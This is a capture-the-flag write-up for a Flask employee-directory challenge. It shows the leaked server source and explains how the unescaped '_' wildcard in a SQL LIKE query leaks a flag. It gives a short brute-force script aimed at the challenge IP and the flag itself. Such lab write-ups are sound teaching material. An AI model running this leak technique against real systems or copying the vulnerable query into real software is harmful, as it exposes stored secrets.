# BugBase Employee Directory - 175 Points

## Description:

```We have made an employee directory for recognizing BugBase employees. Now you can look for employees working in different departments.```

## Solution:

The site was a simple employee listing service. We can select the role from select menu and the employee with that specific role will be listed on the screen. In the sources of the page we can see `/sup3r_s3cr3t` path commented. By visiting that path we get complete source code of the server.

```py
from flask import Flask, request, render_template, make_response
import sqlite3

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html', data="")

@app.route('/sup3r_s3cr3t')
def secret():
    response = make_response(open(__file__).read())
    response.headers['Content-Type'] = 'text/plain'
    return response

@app.route('/getEmployee', methods=['POST'])
def get():
    dept = request.form["dept"]
    conn = sqlite3.connect('employees.db')
    cur = conn.cursor()
    res = cur.execute("select * from employees where Department LIKE ?", (dept.replace("%", ""),))
    data = "id &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Department<br>"
    for r in res:
        for i in r:
            data = data + str(i) + "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
        data = data + "<br>"
    return render_template('index.html', data=data)


if __name__ == '__main__':
    conn = sqlite3.connect('employees.db')
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS employees (id INTEGER PRIMARY KEY, name TEXT, Department TEXT)")
    cur.execute(f'''
        INSERT INTO employees VALUES
            (0, "Random Employee", "{open('flag.txt').read()}"),
            (1, "Tuhin Bose", "Security"),
            (2, "Devang Solanki", "Security"),
            (3, "Sivadath K S", "Security"),
            (4, "Siddharth Johri", "Security"),
            (5, "Harshit Kataria", "Marketing"),
            (6, "Diya Patel", "Marketing"),
            (7, "Anushikha Mehta", "Sales"),
            (8, "Prachi Singh", "Sales"),
            (9, "Femin Justin", "Dev"),
            (10, "P Aditya Mohan", "Dev")
    ''')
    conn.commit()
    conn.close()
    app.run('0.0.0.0', 8080)
```

The flag is stored in the `DEPARTMENT` field. The department is chosen from the user's form request. There are no SQL injection vulnerability in the code but in the query the condition specified is suspicious. They've used SQL `LIKE` operator, we're gonna use it to leak the flag. But the `%` wildcard is replaced with empty string so we can't really use it. But there is another wildcard `_` which can be used. 

> The underscore wildcard (_) represents one, single character

We don't know the length of the flag but no problem we can write a small python script to bruteforce the length.

```python
import requests

payload = ""
URL = 'http://165.232.190.5:8080/getEmployee'

while True:
    data = {"dept": "BugBase{" + payload + "}"}
    r = requests.post(URL, data=data)
    if "BugBase{" in r.text:
        print(r.text)
        exit()
    payload += "_"
```

Flag: `BugBase{th4t_1s_why_1_n3v3r_us3_l1k3}`